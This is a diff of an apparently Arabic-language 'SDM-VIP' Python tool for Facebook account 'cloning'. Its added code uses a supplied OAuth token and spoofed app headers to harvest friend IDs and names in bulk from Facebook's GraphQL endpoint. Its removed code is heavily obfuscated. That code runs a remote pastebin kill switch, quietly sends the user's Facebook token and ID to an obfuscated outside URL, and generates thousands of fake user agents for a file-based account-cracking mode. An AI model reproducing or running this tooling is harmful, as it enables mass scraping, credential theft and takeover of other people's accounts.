+    					input(f"YOU HAVE BAD NET PRESS ENTER:")
+    			try:
+    				file = open('.a.txt', 'r').read().splitlines()
+    			except:
+    				file = [] 
+    			os.system('clear')
+    			print(SDMVIP) 
+    			
+    			print(f"{a40}—"*60)
+    			print(f'{P} \x1b[1;94m[\x1b[1;97m√\x1b[1;94m]\x1b[1;94m \x1b[1;97m You Have ' + str(len(file))+' Ids')
+    			
+    			
+    			linex()
+    			for uid in file:
+    				try:
+    					headers = {"X-Graphql-Client-Library": "graphservice", "X-Graphql-Request-Purpose": "fetch",
+    							   "X-Fb-Privacy-Context": "2368177546817046", "X-Fb-Background-State": "1",
+    							   "X-Fb-Net-Hni": "41001", "X-Fb-Sim-Hni": "41001",
+    							   "Authorization": "OAuth " + self.token + "",
+    							   "X-Fb-Session-Id": "nid=DQGq3fmNKvVh;tid=135;nc=1;fc=1;bc=0;cid=ef0e330bff1cd312f36aa5f2c69c59a9",
+    							   "X-Fb-Connection-Type": "WIFI", "X-Fb-Device-Group": "4481", "X-Tigon-Is-Retry": "False",
+    							   "X-Fb-Rmd": "cached=0;state=URL_ELIGIBLE", "X-Fb-Ta-Logging-Ids": f"graphql:{trace_id}",
+    							   "X-Fb-Friendly-Name": "SuggestionsFriendListContentQuery",
+    							   "X-Fb-Request-Analytics-Tags": "graphservice", "Priority": "u=0",
+    							   "Accept-Encoding": "gzip, deflate", "X-Fb-Http-Engine": "Liger", "X-Fb-Client-Ip": "True",
+    							   "X-Fb-Server-Cluster": "True", "X-Fb-Connection-Token": "ef0e330bff1cd312f36aa5f2c69c59a9",
+    							   "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "567"}
+    					data = {
+    						'User-Agent': '[FBAN/FB4A;FBAV/396.1.0.28.104;FBBV/429650999;FBDM/{density=2.25,width=720,height=1452};FBLC/en_US;FBRV/437165341;FBCR/' + carrier + ';FBMF/' + android + ' MOBILE LIMITED;FBBD/' + android + ';FBPN/com.facebook.katana;FBDV/' + model + ';FBSV/10;FBOP/1;FBCA/arm64-v8a:;]',
+    						'client_doc_id': client_id,
+    						'method': 'post',
+    						'locale': 'en_US',
+    						'pretty': 'false',
+    						'format': 'json',
+    						'variables': '{"profile_id":' + uid + ',"suggestion_friends_paginating_first":2500}',
+    						'fb_api_req_friendly_name': 'SuggestionsFriendListContentQuery',
+    						'fb_api_caller_class': 'graphservice',
+    						'fb_api_analytics_tags': '["At_Connection","GraphServices"]',
+    						'client_trace_id': trace_id,
+    						'server_timestamps': 'true',
+    						'purpose': 'fetch'
+    					}
+    					posted = requests.post("https://graph.facebook.com/graphql", headers=headers, data=data).json()
+    					try:
+    						data = posted['data']['user']['friends']['edges']
+    					except:
+    						continue
+    					if len(data) < 100:
+    						continue
+    					else:
+    						for edge in data:
+    							node = edge['node']
+    							open(lok, 'a', encoding='utf-8').write(node['id'] + "|" + node['name'] + '\n')
+    						if 'y' in sep:
+    							perfector(lok)
+    						try:
+    							total_idss=len(open(lok,'r').readlines())
+    						except:
+    							total_idss='-'
+    						print(f'{P} \x1b[1;94m[\x1b[1;97m√\x1b[1;94m]\x1b[1;94m \x1b[1;97m Id Coolected  ➩ {total_idss}) ')
+    				except KeyError:
+    					pass
+    				except requests.exceptions.ConnectionError:
+    					continue
+    			print('DONE'.format(lok))
+    			
+    			print('M_T_F'.format(len(open(lok,'r').read().splitlines())))
+    			
+    main_menu()
+
+elif M_T_F=='2':import requests,bs4,json,os,sys,random,datetime,time,re
 import requests,bs4,json,os,sys,random,datetime,time,re
 import urllib3,rich,base64
+from time import sleep
 from rich.table import Table as me
 from rich.console import Console as sol
 from bs4 import BeautifulSoup as sop
@@ -1031,376 +1045,669 @@ from rich import pretty
 from rich.text import Text as tekz
 import os
 import webbrowser
-webbrowser.open('https://t.me/py_1hon')
-import webbrowser
-import requests,time,pyfiglet,datetime
-import time,sys
-def SDMID():
-  uuid = str(os.geteuid()) + str(os.getlogin())
-  id = "VIP" 
-  try:
-    httpCaht = requests.get("https://pastebin.com/raw/rrEvSNFF").text
-    if id in httpCaht:
-      print('')
-      print("\033[1;92m انت مشترڪ VIPاداة المبرمج نمࢪود...!")
-      msg = str(os.geteuid())
-      time.sleep(0.3)
-      pass
-    else:
-      print('')
-      print("\033[1;33m تم ايقاف من قبل المبرمج نمࢪود") 
-      
-      time.sleep(1)
-      sys.exit()
-  except:
-    sys.exit()
-    
-    SDMID()
-SDMID()
-from rich .progress import track 
-try :import rich 
-except ImportError :os .system (_IIllllIlllIIIllII )
-try :import stdiomask 
-except ImportError :os .system (_IIIlIIIlllllIIlII )
-try :import requests 
-except ImportError :IlllIlIllllIllIII =_IlIlIIIIlllIlIIlI 
-IlIIIIIIllIIIIIIl =_IlIlIIIIlllIlIIlI 
-IllIIIllllIllIIlI =_IlIIIllIllIlIllll 
-IIllllIllllllIIlI =_IlllIllIIIIIlIIIl 
-IllllllIlIIllIlII =_IlllllIIlIlIlIIII 
-IIIlllllIIlllIIIl =_IIlIIIIIIlIlIllII 
-IllIlIIllIlIllIlI =_IllIIIlIIllIlllII 
-IllIlIIIIIlllIlII =_IlIlIIIIlllIlIIlI 
-IIIlllllIIlllIIIl =_IIlIIIIIIlIlIllII 
-IIIllIIlIllllIIll =_IllllIlIIIIlllIll 
-IlIlllllIIllIIIll =_IlIIIllIllIlIllll 
-print (IIIlllllIIlllIIIl +IIIIIIIIIIIllIlII )
-IIllIlIIlIllllIll ='𝐒𝐃𝐌-𝐕𝐈𝐏 || المبرمج نمرود  @M_T_F '
-IllllIlIIIIIllIIl =nel (IIllIlIIlIllllIll ,style ='\t\t       yellow')
-cetak (nel (IllllIlIIIIIllIIl ,title =''))
-print ('')
-print ('━'*32 +'\n• ❅─────✧❅ 𓆩𝐒𝐃𝐌-𝐕𝐈𝐏𓆪 ❅────────✧❅\n'+'━'*25 )
-IIllllllIlllIIlII =input (f"{IllIIIllllIllIIlI}TOKEN[1;35m :[1;32m ")
-print (_IlIlIllllIIlIIllI )
-IlIIlIIllIlIllIll =input (f"{IllIIIllllIllIIlI}ID [1;32m   : ")
-IIIlIllIIIlIIIlIl ='\nنورت حياتي اداة نمرود المجانية\n قناتي @py_1hon \n للاشتراك في ادواتي المدفوعة راسلني @M_T_F '
-requests .get (_IlIIIIlIIllIlIllI +str (IIllllllIlllIIlII )+_IlIlIllIllIIIIlII +str (IlIIlIIllIlIllIll )+_IIIlIIIlllIIlIIII +str (IIIlIllIIIlIIIlIl ))
-os .system (_IlIIlllIIlIIllIlI )
-pretty .install ()
-IlIlllllIllIlIIll =sol ()
-os .system (_IlIIlllIIlIIllIlI )
-cetak (nel ('\t• Sedang Menginstall Modul Requests •'))
-pretty .install ()
-IlIlllllIllIlIIll =sol ()
-IlIlllllIlIlIIlII =[_IlllIllIllIllllIl ,_IlllIlIllllIlIllI ,_IllIIlIllIllIlIII ,_IlIlIlIlIlllIIIII ,_IllIIlIlllIIllIlI ,_IIIIlllIIlllIIIlI ,_IlllIIIIlIllIIIlI ,_IllIlIlIIIllIllll ,_IIlIIlIllIIllIIII ,_IlIlIIllIlIIIIIIl ,_IIllIlIlIIIIIllll ,_IlIIIIllllIIlllIl ,_IlIIIIIIllIllIlIl ,_IIlIIlIIlllIlIIII ,_IlIlIlllIIlIIllII ,_IIIIIIlllIllIIlll ,_IIIlIlIIIlIllIIIl ,_IIllllIllllIlIlII ,_IlIIlllllIIlIllIl ,_IIlIllIIlIlllIIIl ,_IllIllIlIIIIlIlIl ,_IlllllIIlllllllII ,_IIllIllIllllllIll ,_IllIllllllllIIIll ,_IlllIIIIlIllIIIlI ,_IIlIllllllllIIlIl ,_IllIlIlllllIllIII ,_IIlllIIIIIllllllI ,_IIIlIlIlIIllIllll ,_IIIIIllllIIlIIIll ,_IlllIIIlllIllIlIl ,_IIllIIIIllIllllIl ,_IlIIlIlIlllllIIll ,_IllIlIIllIIlIIIII ,_IIlIIllllllIllllI ,_IlIIllllIIIlIllIl ,_IIllIllIIlIIlIIll ,_IlIllIlllIIIllIll ,_IIIIlIllIllIllIIl ,_IIllIlllIlllIIlll ,_IllIlIlIIIllIlIll ,_IlllIlIIIlllIlIll ,_IlIIlIlIIllIllIll ,_IIIIIllIIIlIllIIl ,_IllIIllIIIllllIll ,_IllIlIIlIIIllllll ,_IIIlIIIIIIlllIIlI ,_IIIIIlIIlIIllllII ,_IlIIllllIIIlIllIl ,_IlIllIllllIIlIIII ,_IIIllIlIlIlIlIllI ,_IlIlIIlllIlIIlllI ,_IllIIIllIllllIIII ,_IlIIllllIIlllllll ,_IlIlIIlllIlIIIllI ,_IIlllllIIllllIlII ,_IIlIllIIlIlllIIIl ,_IIlIIIlllllIIIIII ,_IIlIIIlIlIIllllIl ,_IIIlIIIIIIlllIIlI ,_IllIIllllIIllIIlI ,_IlIlIIllIIIlllIlI ,_IlIllIIlIIllIIIII ,_IlIIllIIIllIIIlII ,_IIllllIlllIllllll ,_IlIIIlIllIIlIllIl ,_IllIIlIlIlIlIIIlI ,_IllllIIlIlIIIIIIl ,_IlIIlIIllIlllIIlI ,_IlllIlllIllIllllI ,_IllIIIllIlllIIIII ,_IIlIIIlllllIIIIII ,_IlIIIlIllIIlIllIl ,_IIIlllIIIIIlIIlII ,_IIIlIlIIIlIllllll ,_IllIIllIIIIIIIlII ,_IIlIIlIIlllllIIIl ,_IlIIIlIllIIlIllIl ,_IlIllIlllIIIllIll ,_IIIlllIlIIIlIlllI ,_IlIlIlIlIlllIIIII ,_IIIlIlIlIIIllIIlI ,_IIlIlIllIIIllIIlI ,_IIIIllllIIIlllIII ,_IIlIIIllIIllIlIlI ,_IIIlIIIIIIIIlIllI ,_IIllIIIllllIIIIIl ]
-IIllIllIlIlIlIIll =[_IlllIllIllIllllIl ,_IlllIlIllllIlIllI ,_IllIIlIllIllIlIII ,_IlIlIlIlIlllIIIII ,_IllIIlIlllIIllIlI ,_IIIIlllIIlllIIIlI ,_IlllIIIIlIllIIIlI ,_IllIlIlIIIllIllll ,_IIlIIlIllIIllIIII ,_IlIlIIllIlIIIIIIl ,_IIllIlIlIIIIIllll ,_IlIIIIllllIIlllIl ,_IlIIIIIIllIllIlIl ,_IIlIIlIIlllIlIIII ,_IlIlIlllIIlIIllII ,_IIIIIIlllIllIIlll ,_IIIlIlIIIlIllIIIl ,_IIllllIllllIlIlII ,_IlIIlllllIIlIllIl ,_IIlIllIIlIlllIIIl ,_IllIllIlIIIIlIlIl ,_IlllllIIlllllllII ,_IIllIllIllllllIll ,_IllIllllllllIIIll ,_IlllIIIIlIllIIIlI ,_IIlIllllllllIIlIl ,_IllIlIlllllIllIII ,_IIlllIIIIIllllllI ,_IIIlIlIlIIllIllll ,_IIIIIllllIIlIIIll ,_IlllIIIlllIllIlIl ,_IIllIIIIllIllllIl ,_IlIIlIlIlllllIIll ,_IllIlIIllIIlIIIII ,_IIlIIllllllIllllI ,_IlIIllllIIIlIllIl ,_IIllIllIIlIIlIIll ,_IlIllIlllIIIllIll ,_IIIIlIllIllIllIIl ,_IIllIlllIlllIIlll ,_IllIlIlIIIllIlIll ,_IlllIlIIIlllIlIll ,_IlIIlIlIIllIllIll ,_IIIIIllIIIlIllIIl ,_IllIIllIIIllllIll ,_IllIlIIlIIIllllll ,_IIIlIIIIIIlllIIlI ,_IIIIIlIIlIIllllII ,_IlIIllllIIIlIllIl ,_IlIllIllllIIlIIII ,_IIIllIlIlIlIlIllI ,_IlIlIIlllIlIIlllI ,_IllIIIllIllllIIII ,_IlIIllllIIlllllll ,_IlIlIIlllIlIIIllI ,_IIlllllIIllllIlII ,_IIlIllIIlIlllIIIl ,_IIlIIIlllllIIIIII ,_IIlIIIlIlIIllllIl ,_IIIlIIIIIIlllIIlI ,_IllIIllllIIllIIlI ,_IlIlIIllIIIlllIlI ,_IlIllIIlIIllIIIII ,_IlIIllIIIllIIIlII ,_IIllllIlllIllllll ,_IlIIIlIllIIlIllIl ,_IllIIlIlIlIlIIIlI ,_IllllIIlIlIIIIIIl ,_IlIIlIIllIlllIIlI ,_IlllIlllIllIllllI ,_IllIIIllIlllIIIII ,_IIlIIIlllllIIIIII ,_IlIIIlIllIIlIllIl ,_IIIlllIIIIIlIIlII ,_IIIlIlIIIlIllllll ,_IllIIllIIIIIIIlII ,_IIlIIlIIlllllIIIl ,_IlIIIlIllIIlIllIl ,_IlIllIlllIIIllIll ,_IIIlllIlIIIlIlllI ,_IlIlIlIlIlllIIIII ,_IIIlIlIlIIIllIIlI ,_IIlIlIllIIIllIIlI ,_IIIIllllIIIlllIII ,_IIlIIIllIIllIlIlI ,_IIIlIIIIIIIIlIllI ,_IIllIIIllllIIIIIl ]
-IllIllllIIllIlIIl =[]
-IIIlIllIIllIIIlII =requests .Session ()
-IIllIIIIlIIIIIllI =[]
-for IIllIIllIlIllllll in range (10000 ):IIllllIlIlIlIllIl ='Nokia5350/10.1.011 (SymbianOS/10;';IlIlIIlIlIlIIlIlI =random .randrange (1 ,9 );IIllIllllIIllllII =random .randrange (1 ,9 );IIlIIlIIIIlIlIIlI ='Series63/5.0 Mozilla/5.0; Profile/MIDP-2.1 Configuration/CLDC-1.1)';IIlIlllllIlIIIIll =random .randrange (100 ,9999 );IIIlIlIlllIIlIlII ='AppleWebKit/525 (KHTML, like Gecko)';IllIIllIlIIllIIIl =random .randrange (1 ,9 );IIlIIllIIIIllIlll =random .randrange (1 ,4 );IlllllIIllIlIIIll =random .randrange (1 ,4 );IIlIllIlllllIIIlI =random .randrange (1 ,4 );IlllIIIllIIlIllll ='Safari/525 3gpp-gba';IlIlllIlIlIIIllll =f"{IIllllIlIlIlIllIl}{IlIlIIlIlIlIIlIlI}.{IIllIllllIIllllII} {IIlIIlIIIIlIlIIlI}{IIlIlllllIlIIIIll}{IIIlIlIlllIIlIlII}{IllIIllIlIIllIIIl}.{IIlIIllIIIIllIlll}.{IlllllIIllIlIIIll}.{IIlIllIlllllIIIlI} {IlllIIIllIIlIllll}";IIllIllIlIlIlIIll .append (IlIlllIlIlIIIllll );IlIIlllIIlllIlllI ='NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (SymbianOS/9.2; U;';IlIlIIlIlIlIIlIlI =random .choice (['7.0',_IllllIlIllllIlIll ,'9',_IIllIlllIlIlIlIII ,_IlIIIIIIIlIllIIlI ,_IllIlIlllIllIIlIl ]);IIllIllllIIllllII =random .choice (['Series60/3.1 NokiaE71-1/100.07.57; Profile/MIDP-2.0 Configuration/CLDC-1.1 )']);IIlIIlIIIIlIlIIlI =random .choice ([_IIIIIIlIIIlIllIIl ,'B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X',_IIIllllIIIlIIlIII ,'Z']);IIlIlllllIlIIIIll =random .randrange (1 ,999 );IIIlIlIlllIIlIlII =random .choice ([_IIIIIIlIIIlIllIIl ,'B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X',_IIIllllIIIlIIlIII ,'Z']);IllIIllIlIIllIIIl ='AppleWebKit/413 (KHTML, like Gecko)';IIlIIllIIIIllIlll =random .randrange (80 ,103 );IlllllIIllIlIIIll ='0';IIlIllIlllllIIIlI =random .randrange (4200 ,4900 );IlllIIIllIIlIllll =random .randrange (40 ,150 );IIlIIIIllIIllIllI ='Safari/413 UNTRUSTED/1.0';IIlIlIlIIlllllIII =f"{IlIIlllIIlllIlllI} {IlIlIIlIlIlIIlIlI}; {IIllIllllIIllllII}{IIlIIlIIIIlIlIIlI}{IIlIlllllIlIIIIll}{IIIlIlIlllIIlIlII}) {IllIIllIlIIllIIIl}{IIlIIllIIIIllIlll}.{IlllllIIllIlIIIll}.{IIlIllIlllllIIIlI}.{IlllIIIllIIlIllll} {IIlIIIIllIIllIllI}";IlIlllllIlIlIIlII .append (IIlIlIlIIlllllIII );IlIIlllIIlllIlllI ='NokiaX2-00/5.0 (08.25) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Linux; Android 12;';IlIlIIlIlIlIIlIlI =random .choice (['7.0',_IllllIlIllllIlIll ,'9',_IIllIlllIlIlIlIII ,_IlIIIIIIIlIllIIlI ,_IllIlIlllIllIIlIl ]);IIllIllllIIllllII =random .choice (['SAMSUNG SM-X906B)']);IIlIIlIIIIlIlIIlI =random .choice ([_IIIIIIlIIIlIllIIl ,'B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X',_IIIllllIIIlIIlIII ,'Z']);IIlIlllllIlIIIIll =random .randrange (1 ,999 );IIIlIlIlllIIlIlII =random .choice ([_IIIIIIlIIIlIllIIl ,'B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X',_IIIllllIIIlIIlIII ,'Z']);IllIIllIlIIllIIIl ='AppleWebKit/537.36 (KHTML, like Gecko)';IIlIIllIIIIllIlll =random .randrange (80 ,103 );IlllllIIllIlIIIll ='0';IIlIllIlllllIIIlI =random .randrange (4200 ,4900 );IlllIIIllIIlIllll =random .randrange (40 ,150 );IIlIIIIllIIllIllI ='Chrome/100.0.4896.88 Safari/537.36 UNTRUSTED/1.0';IIlIlIlIIlllllIII =f"{IlIIlllIIlllIlllI} {IlIlIIlIlIlIIlIlI}; {IIllIllllIIllllII}{IIlIIlIIIIlIlIIlI}{IIlIlllllIlIIIIll}{IIIlIlIlllIIlIlII}) {IllIIllIlIIllIIIl}{IIlIIllIIIIllIlll}.{IlllllIIllIlIIIll}.{IIlIllIlllllIIIlI}.{IlllIIIllIIlIllll} {IIlIIIIllIIllIllI}";IlIlllllIlIlIIlII .append (IIlIlIlIIlllllIII );IlIIlllIIlllIlllI ='NokiaC1-01/2.0 (06.15) Profile/MIDP-2.1 Configuration/CLDC-1.1 UCWEB/2.0 (Java; U; MIDP-2.0; en-US;';IlIlIIlIlIlIIlIlI =random .choice (['7.0',_IllllIlIllllIlIll ,'9',_IIllIlllIlIlIlIII ,_IlIIIIIIIlIllIIlI ,_IllIlIlllIllIIlIl ]);IIllIllllIIllllII =random .choice (['nokiac1-01)']);IIlIIlIIIIlIlIIlI =random .choice ([_IIIIIIlIIIlIllIIl ,'B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X',_IIIllllIIIlIIlIII ,'Z']);IIlIlllllIlIIIIll =random .randrange (1 ,999 );IIIlIlIlllIIlIlII =random .choice ([_IIIIIIlIIIlIllIIl ,'B','C','D','E','F','G','H','I','J','K','L','M','N','O','P','Q','R','S','T','U','V','W','X',_IIIllllIIIlIIlIII ,'Z']);IllIIllIlIIllIIIl ='U2/1.0.0 UCBrowser/8.9.0.251';IIlIIllIIIIllIlll =random .randrange (80 ,103 );IlllllIIllIlIIIll ='0';IIlIllIlllllIIIlI =random .randrange (4200 ,4900 );IlllIIIllIIlIllll =random .randrange (40 ,150 );IIlIIIIllIIllIllI ='U2/1.0.0 Mobile UNTRUSTED/1.06';IIlIlIlIIlllllIII =f"{IlIIlllIIlllIlllI} {IlIlIIlIlIlIIlIlI}; {IIllIllllIIllllII}{IIlIIlIIIIlIlIIlI}{IIlIlllllIlIIIIll}{IIIlIlIlllIIlIlII}) {IllIIllIlIIllIIIl}{IIlIIllIIIIllIlll}.{IlllllIIllIlIIIll}.{IIlIllIlllllIIIlI}.{IlllIIIllIIlIllll} {IIlIIIIllIIllIllI}";IlIlllllIlIlIIlII .append (IIlIlIlIIlllllIII )
-id ,IlllIIIIllIlIIlII ,IlIIlIIIlIIlIlllI ,IIIlllIIlIIIlllll ,IIlIIIIIIIIIlIIIl ,IIllIIlllIIIIIlll ,IIIlIllIlIIlIIlll ,IIlllIIlllIllIlII ,IIlllllllIllIIIII ,IlIIlIlllIIIIllIl ,IIIIlIllllIllIlll ,IIIlIlIlIIlIlIIll ,IlIlIIIIIlIlllllI =[],[],0 ,0 ,0 ,[],[],[],[],[],[],[],[]
-IllIllllIIllIlIIl =[]
-IllIlIlllIlllIIIl ,IllllIIlIIIIIIlll =[],[]
-IlIlIIIIIlllllIIl =_IlllllIIlIlIlIIII 
-IIIlIlIIlIlIlIllI =_IIIlIIlIIIIllIlIl 
-IIIIlIIllIIllIIlI =_IIlIlllIlIIlIlIlI 
-IIIIIlIllllllllll =_IlllIIllIlIllIlll 
-IIIlllllIIlllIIIl =_IlIllIlIIIIlllIII 
-IlIlIIlIIllIIlIII =_IllllIIllIIIllllI 
-IIlllIlIIlIIllIIl =_IlIlIllIIllllIIll 
-IlIIIlIlIIIIIlIII ='\x1b[0m'
-IlllIlIllllIllIII =_IIllIllllIIlIIllI 
-IIIIIllIIIIIIIlII ='\x1b[41m\x1b[1;97m'
-IIlllIllllllIlIIl ='\x1b[m'
-IlllllllIlllIIIII =_IIIlIIlIIIIllIlIl 
-IlllIIIllIIlIllll ='\x1b[93m'
-IIlIIllIIIIllIlll =_IIlIlllIlIIlIlIlI 
-IlllIIIlllIIllllI =_IIIIlIlIIllllllII 
-IIIIIllIlIIlllIIl ='\x1b[95m'
-IIlIIIlllIllIllII ='\x1b[33m'
-IlIlIIlIlIlIIlIlI =_IlIlIllIIllllIIll 
-Illllllllllllllll ='\x1b[0;34m'
-IIIlIIIlIIllIllIl =_IlllllIIlIlIlIIII 
-IIllIlIIlllIIlllI ='\x1b[30m'
-IIIlllIllIllIIIII ='\x1b[31m'
-IIllllIlIIlIllIII =_IIIIlIlIIllllllII 
-IIlIllIIllIllIlll ='\x1b[33m'
-IlllllIlIIIIllllI ='\x1b[34m'
-IIIllIIllIIlIlIlI ='\x1b[35m'
-IlllllIIIIIIIIlII ='\x1b[36m'
-IIIIllIlllIlIIlIl ='\x1b[37m'
-IllllIIlIIllIllII ='\x1b[91m'
-IlIlIIlllllIlIIll ='\x1b[92m'
-IlIlllllIIlIlIIlI ='\x1b[93m'
-IllIlIlIllIIIllll ='\x1b[95m'
-Illllllllllllllll =_IlIIIIIlllllIlIll 
-IlIIIIIlllIlllIII ='\x1b[38;5;204m'
-IIIIIllIIIlllIIlI =_IlIllIllIllllIlIl 
-IllIlllllllIIIlIl ='\x1b[38;5;193m'
-IlIIlIIIIIlIIlIIl =_IIlIlllIlIIlIIIll 
-IllIlIIIIlIllIlII ='\x1b[38;5;190m'
-IIlllIlIIlIIllIIl ='\x1b[0;96m'
-IlIlIIIIIlllllIIl =_IIIIIIlIIIlIllllI 
-IllIllIlIIIllIllI =_IlIIIIIlllllIlIll 
-IlIllllllIllIIIII ='\x1b[38;5;106m'
-IlIlIIIlIllIIllll =random .choice ([IlllllllIlllIIIII ,IIlllIlIIlIIllIIl ,IIlIIllIIIIllIlll ,IIIIIllIlIIlllIIl ,IlIlIIlIlIlIIlIlI ,IllIlIIIIlIllIlII ,IlIIlIIIIIlIIlIIl ,IllIlllllllIIIlIl ,IIIIIllIIIlllIIlI ,IlIIIIIlllIlllIII ,IIIlllllIIlllIIIl ,IllIlIlIllIIIllll ,IlIlllllIIlIlIIlI ,IlIlIIlllllIlIIll ,IllllIIlIIllIllII ,IIIIllIlllIlIIlIl ,IlllllIIIIIIIIlII ,IIIllIIllIIlIlIlI ,IlllllIlIIIIllllI ,IIlIllIIllIllIlll ,IIllllIlIIlIllIII ,IIIlllIllIllIIIII ,IIllIlIIlllIIlllI ,IIIlIIIlIIllIllIl ,IlllIlIllllIllIII ,Illllllllllllllll ,IlIlIIlIlIlIIlIlI ,IIlIIIlllIllIllII ,IlllIIIlllIIllllI ,IIlllIllllllIlIIl ,IllIlIIllIlIllIlI ,IlIlIIIIIlllllIIl ,IIIIIllIlIIlllIIl ,IIIlllllIIlllIIIl ,IllIllIlIIIllIllI ,IlIllllllIllIIIII ,Illllllllllllllll ])
-IlIIlIIIlIlIlIlII ={_IIIllllIlIlIIlIlI :'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'}
-IIlllIlllIlllIlIl ={_IIllIIlIllllIlIIl :'jan','2':'feb','3':'mar','4':'apr','5':'may','6':'jun','7':'jul','8':'aug','9':'sep',_IIllIlllIlIlIlIII :'oct',_IlIIIIIIIlIllIIlI :'nov',_IllIlIlllIllIIlIl :'dec'}
-IIlllIIIllllllIlI ={_IIllIIlIllllIlIIl :'jan','2':'feb','3':'mar','4':'apr','5':'may','6':'jun','7':'jul','8':'aug','9':'sep',_IIllIlllIlIlIlIII :'oct',_IlIIIIIIIlIllIIlI :'nov',_IllIlIlllIllIIlIl :'dec'}
-IllIIIIlIIIIIllll ='Mozilla/5.0 (Linux; Android 10; LIO-N29; HMSCore 6.4.0.312) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.105 HuaweiBrowser/12.0.1.302 Mobile Safari/537.3'
-IIIIlIllIIllIIlIl =datetime .datetime .now ().day 
-IlIIlllllIIIIIIII =IIlllIlllIlllIlIl [str (datetime .datetime .now ().month )]
-IlIllIIlIlIllllII =datetime .datetime .now ().year 
-IIIllIlIlIlIIlIlI ='OK-'+str (IIIIlIllIIllIIlIl )+_IIIIIllllIlIlIIII +str (IlIIlllllIIIIIIII )+_IIIIIllllIlIlIIII +str (IlIllIIlIlIllllII )+_IllIIIIlIlIIIlIIl 
-IllllIIllllIlIlll ='CP-'+str (IIIIlIllIIllIIlIl )+_IIIIIllllIlIlIIII +str (IlIIlllllIIIIIIII )+_IIIIIllllIlIlIIII +str (IlIllIIlIlIllllII )+_IllIIIIlIlIIIlIIl 
-def IIlIIIllIlIlIlllI (IIlIIlIIIlIllIIll ):
-	for IIIIIIlIIIIlllllI in IIlIIlIIIlIllIIll +_IlIlIllllIIlIIllI :sys .stdout .write (IIIIIIlIIIIlllllI );sys .stdout .flush ();time .sleep (.01 )
-def IlllIIIlllllIlllI ():print (IlIlIIIllllllIIIl +'نمرود SDM ')
-IIllIllIlIIllIIII =_IlIlIIIIlllIlIIlI 
-IlIlIlIIIlIllllIl =_IllIIIlIIllIlllII 
-IlIIIlllllIllIllI =_IllllIlIIIIlllIll 
-IIIllllIlIlIlIllI =_IlIIIllIllIlIllll 
-IIlllIIlIIlllIIIl =_IlIIIIIlllllIlIll 
-IlllllIIIIIIIlIII =_IlllIlIlllIllIlIl 
-IIIIIllIllllllIIl =_IIlIllIIllllllllI 
-IlllllIIllIIIIIIl =_IIllIllllIIlIIllI 
-IIIllIlIllIIllIll =_IlllIIlIlIIIllIII 
-IlIIllIlIIllIlllI =_IllIlIIIIIlIllllI 
-IlIIIlIIIIlIlIIll =_IIIlIIlIlIIIlIIll 
-IlIlIIIllllllIIIl =_IlIllIllIllllIlIl 
-IIIIIIlIlIIIlIIIl =_IlIIllIIllllIlIII 
-IllIlllIlIIllIIll =_IllIlIIllIIIIIIII 
-IIllllIIlIIIIIIlI =_IIIIlIlIIllIllIlI 
-IIIlllIlIlIlIlIIl =_IllIlIIllIIIIIIII 
-IIIllIlllIIllIlIl =_IIIlIlIIIllllIlll 
-IlIlIllllIllIlIlI =_IllIllllIIIllIIll 
-IlIllIllIIIlIllIl =_IlIIlIlIlllIIlIll 
-IIllllIlllIIIlIll =_IllIIllIIlIIllIll 
-IlIlIllllIIlIllIl =_IIIIIlllllIIllIll 
-IlIllIlIIllIllIIl =_IIlIlllIlIIlIIIll 
-IIIllIlIIlllIIlIl =_IllIIlIIIIlllIIIl 
-IIIlIlIlllIIllIll =_IIlIIIlllIlIIIlll 
-IIllllllIIlllIllI =_IIlIIlIlIllIIIlIl 
-IllllIlllllIllIlI =_IIlIlIllIlIlIIIII 
-IIlIIlIIIlIlIlllI =_IIIIlIlIIIIlIIllI 
-IIIIIIlIlIIlllIll =_IIllIllIlIIlIIIlI 
-IlIIIlIIIIlIIIlII =_IIlIlIllIIllllIll 
-IlIllIllIIllIIlll =_IIIIIIllllIlIIllI 
-IIllIIlIIIlIIlIIl =_IIIIIIlIIIlIllllI 
-IlllIIIIIIlIIlllI =_IllIllIlIIllIlIIl 
-IIlllIlIlIlllllII =_IIllIlIlllIlIIIIl 
-IlllllIlIIIlIIIIl =_IlllIIllIIlIllIlI 
-IlIlllIIIIIllIlIl =_IlIlllllIlIIIIlII 
-IIIllIIIlIllIIlll =_IIIlIlllllIIlIllI 
-IIlllllIlllIIlIII =_IlIlIIllllIlllIlI 
-IlIIIIIlllIlIllll =_IllIIIllIlllIlIll 
-IlIlIIIIlIIIlIIIl =_IllIIllIlIlIlllll 
-IIIIlIIllllIIlllI =_IIIIIIlIIllllIlll 
-def IIlIlIlIlIIllIlII ():
-	try :IlIlIlIIIIIllIlIl =open (_IllIIIIlllllIlIII ,_IIllIlIlIlIlIIllI ).read ();IIlIIlIIlllllllII =open ('.cok.txt',_IIllIlIlIlIlIIllI ).read ()
-	except IOError :print ('[×] Cookies NO ');time .sleep (5 );SDMM ()
-	os .system (_IlIIlllIIlIIllIlI );IlllIIIlllllIlllI ();print (f"[ 01 ] FILE CLONE| صـيد من ملف");print (f"[ 00 ] Exit | خـࢪوج");_____IPYTHINI_____ =input (IIllIIlIIIlIIlIIl +'Select :\x1b[1;97m ')
-	if _____IPYTHINI_____ in [_IIllIIlIllllIlIIl ,_IIIIIlIIIIIIlIlIl ]:IIllllIllllllIIlI ()
-	elif _____IPYTHINI_____ in ['0','00']:sys .exit ()
-	else :print (IIllllIlllIIIlIll +'NOT SELECT ');IIlIlIllIllIlIlIl ()
-def IllIIlIIIllIIlIlI ():print (f" [1;91m[1;96m[1;97m [1;91m~~~~~Main menu~~~~~");time .sleep (2 );IIlIlIllIllIlIlIl ()
